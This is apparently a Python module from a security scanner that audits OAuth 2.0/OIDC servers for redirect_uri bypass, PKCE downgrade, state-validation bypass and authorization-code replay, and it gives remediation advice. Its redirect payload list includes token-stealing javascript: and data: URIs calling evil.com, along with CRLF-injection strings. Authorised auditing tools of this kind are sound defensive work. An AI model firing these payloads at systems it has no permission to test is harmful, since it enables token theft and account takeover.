"""OAuth 2.0 / OIDC security audit — redirect_uri bypass, PKCE downgrade, state validation, CSRF, token leakage."""
from __future__ import annotations
import asyncio
import random
import re
import string
import urllib.parse
from typing import Any
from talisman.utils.http_client import TalismanHTTPClient
from talisman.utils.logger import get_logger, console, print_finding

log = get_logger(__name__)

OAUTH_DISCOVERY_PATHS = [
    "/.well-known/openid-configuration",
    "/.well-known/oauth-authorization-server",
    "/oauth/.well-known/openid-configuration",
    "/auth/realms/master/.well-known/openid-configuration",
    "/.well-known/oauth-authorization-server/",
]

REDIRECT_URI_BYPASS_VARIANTS = [
    ("https://evil.com", "Direct evil redirect"),
    ("https://evil.com/", "Direct evil redirect with slash"),
    ("{legit}@evil.com", "Userinfo confusion"),
    ("https://{legit}.evil.com", "Subdomain confusion"),
    ("https://{legit}evil.com", "Domain prefix confusion"),
    ("https://evil.com/{legit}", "Path confusion"),
    ("{legit}/../redirect?to=https://evil.com", "Path traversal"),
    ("{legit}%0d%0aLocation: https://evil.com", "CRLF injection in redirect"),
    ("javascript:fetch('https://evil.com/steal?token='+location.hash)", "javascript URI"),
    ("data:text/html,<script>location='https://evil.com/?c='+location.hash</script>", "data URI"),
    ("{legit}/?code=x&state=y", "Parameter pollution bypass"),
    ("{legit}#fragment", "Fragment manipulation"),
]

STATE_VALIDATION_VARIANTS = [
    ("drop_state", {"state": None}),
    ("empty_state", {"state": ""}),
    ("wrong_state", {"state": "ATTACKER_STATE"}),
    ("missing_code", {}),
    ("replay_code", {}),
]

PKCE_METHODS = ["S256", "plain", None]


async def _discover_oauth(base_url: str, client: TalismanHTTPClient) -> dict | None:
    for path in OAUTH_DISCOVERY_PATHS:
        try:
            r = await client.get(base_url.rstrip("/") + path, timeout=8)
            if r.status_code == 200:
                data = r.json()
                if "authorization_endpoint" in data or "token_endpoint" in data:
                    return data
        except Exception:
            pass
    return None


async def _test_pkce_downgrade(
    auth_ep: str, token_ep: str, client_id: str,
    redirect_uri: str, client: TalismanHTTPClient,
) -> list[dict[str, Any]]:
    """Test if PKCE can be downgraded by omitting code_challenge."""
    findings: list[dict[str, Any]] = []
    state = ''.join(random.choices(string.ascii_letters + string.digits, k=16))

    for method in PKCE_METHODS:
        params = {
            "response_type": "code",
            "client_id": client_id,
            "redirect_uri": redirect_uri,
            "state": state,
            "scope": "openid profile",
        }

        if method:
            if method == "S256":
                import hashlib, base64
                code_verifier = ''.join(random.choices(string.ascii_letters + string.digits, k=64))
                code_challenge = base64.urlsafe_b64encode(
                    hashlib.sha256(code_verifier.encode()).digest()
                ).rstrip(b"=").decode()
                params["code_challenge"] = code_challenge
                params["code_challenge_method"] = "S256"
            elif method == "plain":
                params["code_challenge"] = "plain_challenge"
                params["code_challenge_method"] = "plain"

        try:
            auth_url = f"{auth_ep}?{urllib.parse.urlencode(params)}"
            r = await client.get(auth_url, allow_redirects=False, timeout=8)
            location = r.headers.get("location", "")

            # Extract authorization code from redirect
            code = None
            if "code=" in location:
                code = re.search(r"code=([^&]+)", location)
                code = code.group(1) if code else None

            if code:
                # Try to exchange without PKCE verifier
                token_params = {
                    "grant_type": "authorization_code",
                    "code": code,
                    "client_id": client_id,
                    "redirect_uri": redirect_uri,
                }
                r2 = await client.post(token_ep, data=token_params, timeout=8)
                if r2.status_code == 200 and "access_token" in r2.text:
                    method_desc = "no PKCE" if method is None else f"PKCE-{method}"
                    findings.append({
                        "type": "pkce_downgrade",
                        "method_tested": method_desc,
                        "detail": f"Token exchange succeeded without PKCE verification (method={method_desc})",
                        "evidence": r2.text[:300],
                    })
        except Exception:
            pass

    return findings


async def _test_state_validation(
    auth_ep: str, token_ep: str, client_id: str,
    redirect_uri: str, client: TalismanHTTPClient,
) -> list[dict[str, Any]]:
    """Test OAuth state parameter validation."""
    findings: list[dict[str, Any]] = []

    # Get a legitimate authorization code first
    state = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    code_challenge = ''.join(random.choices(string.ascii_letters + string.digits, k=32))

    params = {
        "response_type": "code",
        "client_id": client_id,
        "redirect_uri": redirect_uri,
        "state": state,
        "code_challenge": code_challenge,
        "code_challenge_method": "S256",
    }

    try:
        auth_url = f"{auth_ep}?{urllib.parse.urlencode(params)}"
        r = await client.get(auth_url, allow_redirects=False, timeout=8)
        location = r.headers.get("location", "")
        code = re.search(r"code=([^&]+)", location)
        code = code.group(1) if code else None

        if not code:
            return findings

        # Now test state validation at authorization endpoint
        for test_name, overrides in STATE_VALIDATION_VARIANTS[:3]:
            test_params = dict(params)
            for k, v in overrides.items():
                if v is None:
                    test_params.pop(k, None)
                else:
                    test_params[k] = v

            if "code" in test_name:
                continue  # Skip code-related tests at auth endpoint

            try:
                test_url = f"{auth_ep}?{urllib.parse.urlencode(test_params)}"
                r2 = await client.get(test_url, allow_redirects=False, timeout=8)
                if r2.status_code in (301, 302):
                    location2 = r2.headers.get("location", "")
                    if "code=" in location2:
                        findings.append({
                            "type": "state_validation_bypass",
                            "test": test_name,
                            "detail": f"Authorization code issued despite {test_name}",
                            "evidence": location2[:200],
                        })
            except Exception:
                pass

        # Test CSRF: use the legitimate code but with attacker's state
        csrf_params = {
            "grant_type": "authorization_code",
            "code": code,
            "client_id": client_id,
            "redirect_uri": redirect_uri,
            "code_verifier": code_challenge,
        }
        for test_name, overrides in STATE_VALIDATION_VARIANTS:
            test_params2 = dict(csrf_params)
            for k, v in overrides.items():
                if v is None:
                    test_params2.pop(k, None)
                else:
                    test_params2[k] = v
            if test_name == "replay_code":
                # Test: can the same code be exchanged twice?
                try:
                    r3 = await client.post(token_ep, data=dict(csrf_params), timeout=8)
                    r4 = await client.post(token_ep, data=dict(csrf_params), timeout=8)
                    if r3.status_code == 200 and r4.status_code == 200:
                        findings.append({
                            "type": "token_replay",
                            "detail": "Authorization code can be exchanged multiple times",
                            "evidence": f"First: {r3.status_code}, Second: {r4.status_code}",
                        })
                except Exception:
                    pass
    except Exception:
        pass

    return findings


async def run(
    target: str,
    session: Any = None,
    scope: Any = None,
    rate_limiter: Any = None,
    proxy: str | None = None,
    client_id: str | None = None,
    **kwargs: Any,
) -> dict[str, Any]:
    url = target if "://" in target else f"https://{target}"
    console.print(f"\n[module][+] OAuth 2.0 / OIDC Audit (Deep)[/module] -> [target]{url}[/target]")
    findings: list[dict[str, Any]] = []

    if not client_id:
        console.print(" [dim]No client_id provided. Provide --args client_id=X for deep testing.[/dim]")
        # Still do discovery
        async with TalismanHTTPClient(proxy=proxy, timeout=12) as client:
            oauth_config = await _discover_oauth(url, client)
            if oauth_config:
                console.print(f" [success][+] OAuth/OIDC configuration discovered[/success]")
                findings.append({"issue": "discovery_only", "config": oauth_config})
            else:
                console.print(" No OAuth/OIDC configuration found")
        return {"target": url, "findings": findings}

    async with TalismanHTTPClient(proxy=proxy, timeout=12) as client:
        # Discover OAuth config
        oauth_config = await _discover_oauth(url, client)

        if not oauth_config:
            console.print(" No OAuth/OIDC configuration found")
            return {"target": url, "findings": findings}

        console.print(f" [success][+] OAuth/OIDC configuration discovered[/success]")
        auth_ep = oauth_config.get("authorization_endpoint", "")
        token_ep = oauth_config.get("token_endpoint", "")
        console.print(f" Authorization: {auth_ep}")
        console.print(f" Token: {token_ep}")

        # Check for dangerous response types
        response_types = oauth_config.get("response_types_supported", [])
        if "token" in response_types:
            print_finding("OAuth implicit flow supported (token in URL fragment)", "medium", url)
            findings.append({"issue": "implicit_flow", "severity": "medium"})
            if session:
                await session.add_finding(
                    target=url, module="oauth", vuln_type="implicit_flow",
                    severity="medium", confidence="confirmed",
                    title="OAuth implicit flow supported",
                    description="Implicit flow returns access tokens in URL fragments, exposing them to browser history and referrer headers.",
                    remediation="Migrate to authorization code flow with PKCE. Disable implicit flow.",
                    cwe="CWE-346",
                )

        # Check PKCE support
        pkce_methods = oauth_config.get("code_challenge_methods_supported", [])
        if not pkce_methods:
            print_finding("PKCE not enforced by OAuth server", "medium", url)
            findings.append({"issue": "no_pkce", "severity": "medium"})
            if session:
                await session.add_finding(
                    target=url, module="oauth", vuln_type="no_pkce",
                    severity="medium", confidence="confirmed",
                    title="PKCE not enforced by OAuth server",
                    description="OAuth server does not mandate PKCE. Authorization codes can be intercepted and exchanged.",
                    remediation="Enable PKCE enforcement. Disable authorization code grant without PKCE.",
                    cwe="CWE-346",
                )

        # Determine redirect_uri for testing
        original_host = url.split("://")[1].split("/")[0].split(":")[0]
        legit_redirect = f"https://{original_host}/callback"

        # Test redirect_uri bypass
        if auth_ep and client_id:
            console.print("  Testing redirect_uri bypass variants...")
            for variant, desc in REDIRECT_URI_BYPASS_VARIANTS[:6]:
                test_redirect = variant.replace("{legit}", f"https://{original_host}/callback")
                test_url = (
                    f"{auth_ep}?response_type=code&client_id={client_id}"
                    f"&redirect_uri={urllib.parse.quote(test_redirect)}&state=test"
                )
                try:
                    r = await client.get(test_url, allow_redirects=False, timeout=8)
                    if r.status_code in (301, 302):
                        location = r.headers.get("location", "")
                        if "evil.com" in location.lower() or "code=" in location:
                            severity = "critical"
                            title = f"OAuth redirect_uri bypass: {desc}"
                            print_finding(title, severity, url)
                            findings.append({"issue": "redirect_uri_bypass",
                                "payload": test_redirect, "location": location, "description": desc})
                            if session:
                                await session.add_finding(
                                    target=url, module="oauth",
                                    vuln_type="oauth_redirect_bypass",
                                    severity=severity, confidence="confirmed",
                                    title=title,
                                    description=f"OAuth redirect_uri validation bypassed using '{desc}'. Authorization codes can be stolen to achieve account takeover.",
                                    evidence=f"Location: {location}",
                                    remediation="1. Use exact string matching for redirect_uri validation. 2. Pre-register all allowed redirect URIs. 3. Never use regex or prefix matching.",
                                    cvss_score=9.3, cwe="CWE-601",
                                )
                            break
                except Exception:
                    pass

        # PKCE downgrade test
        if auth_ep and token_ep and client_id:
            console.print("  Testing PKCE downgrade...")
            pkce_findings = await _test_pkce_downgrade(
                auth_ep, token_ep, client_id, legit_redirect, client
            )
            for pf in pkce_findings:
                if pf.get("type") == "pkce_downgrade":
                    title = f"OAuth PKCE downgrade: {pf.get('method_tested', 'unknown')}"
                    print_finding(title, "critical", url)
                    findings.append(pf)
                    if session:
                        await session.add_finding(
                            target=url, module="oauth",
                            vuln_type="oauth_pkce_downgrade",
                            severity="critical", confidence="confirmed",
                            title=title,
                            description=f"PKCE downgrade possible. Token exchange succeeded without PKCE verification (method={pf.get('method_tested')}). Authorization codes can be exchanged by attackers who intercept them.",
                            evidence=pf.get("evidence", ""),
                            remediation="1. Always require code_challenge in authorization requests. 2. Enforce code_verifier in token exchange. 3. Reject token exchange without PKCE.",
                            cvss_score=8.8, cwe="CWE-346",
                        )
                    break

        # State validation tests
        if auth_ep and token_ep and client_id:
            console.print("  Testing state validation...")
            state_findings = await _test_state_validation(
                auth_ep, token_ep, client_id, legit_redirect, client
            )
            for sf in state_findings:
                sftype = sf.get("type", "")
                if sftype == "state_validation_bypass":
                    title = f"OAuth state validation bypass: {sf.get('test', 'unknown')}"
                    print_finding(title, "high", url)
                    findings.append(sf)
                    if session:
                        await session.add_finding(
                            target=url, module="oauth",
                            vuln_type="oauth_state_bypass",
                            severity="high", confidence="confirmed",
                            title=title,
                            description=f"OAuth state parameter validation bypassed: {sf.get('test')}. Attackers can perform CSRF on the OAuth flow.",
                            evidence=sf.get("evidence", ""),
                            remediation="1. Always validate state parameter. 2. Use cryptographically random unguessable state values. 3. Bind state to user session.",
                            cvss_score=7.5, cwe="CWE-352",
                        )
                elif sftype == "token_replay":
                    title = "OAuth authorization code replay"
                    print_finding(title, "critical", url)
                    findings.append(sf)
                    if session:
                        await session.add_finding(
                            target=url, module="oauth",
                            vuln_type="oauth_code_replay",
                            severity="critical", confidence="confirmed",
                            title=title,
                            description="Authorization code can be exchanged multiple times. An attacker who intercepts a single code can obtain multiple access tokens.",
                            evidence=sf.get("evidence", ""),
                            remediation="1. Authorization codes must be single-use. 2. Track code usage server-side. 3. Short code expiry (max 60 seconds).",
                            cvss_score=9.1, cwe="CWE-346",
                        )

    console.print(f"  OAuth audit complete -- {len(findings)} issues")
    return {"target": url, "oauth_config": oauth_config, "findings": findings, "count": len(findings)}
